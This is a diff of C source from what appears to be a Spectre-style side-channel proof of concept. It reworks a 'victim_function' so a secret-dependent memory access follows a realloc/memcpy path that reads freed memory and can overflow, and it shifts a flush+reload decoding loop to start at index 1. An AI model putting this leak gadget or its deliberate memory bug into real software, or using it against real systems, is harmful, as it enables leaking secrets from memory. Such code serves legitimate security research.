@@ -66,19 +66,7 @@ uint8_t* array_init(){
 }
 
 
-uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
-    if (new_size < array_size / 2 || new_size > array_size) {
-        uint8_t *old_array = *array;
-        *array = realloc(*array, new_size);
-        memcpy(*array, old_array, array_size); // move the old content
-    } else {
-        index &= array_index_mask_nospec(index, new_size);
-        uint8_t secret = (*array)[index];
-        _maccess(page + secret * stride);
-    }
 
-    return NULL;
-}
 
 
 
@@ -105,7 +93,7 @@ void flush_lines(void *start, size_t stride, size_t N) {
 void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
     uint64_t most_hits = 0, scd_most_hits = 0;
     unsigned char raw_c = '\0', scd_raw_c = '\0';
-    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
+    for (size_t i = 1; i < cnt && i < SYMBOL_CNT; i++) {
         if (most_hits < hits[i]) {
             scd_most_hits = most_hits;
             scd_raw_c = raw_c;
@@ -154,6 +142,19 @@ uint64_t calibrate_latency() {
            hit, miss, threshold);
     free(data);
     return threshold;
+}
+
+uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
+    if (new_size < array_size / 2 || new_size > array_size) {
+        uint8_t *old_array = *array;
+        *array = realloc(*array, new_size);
+        memcpy(*array, old_array, array_size); // move the old content
+    }
+    index &= array_index_mask_nospec(index, new_size);
+    uint8_t secret = (*array)[index];
+    _maccess(page + secret * stride);
+
+    return NULL;
 }
 
 
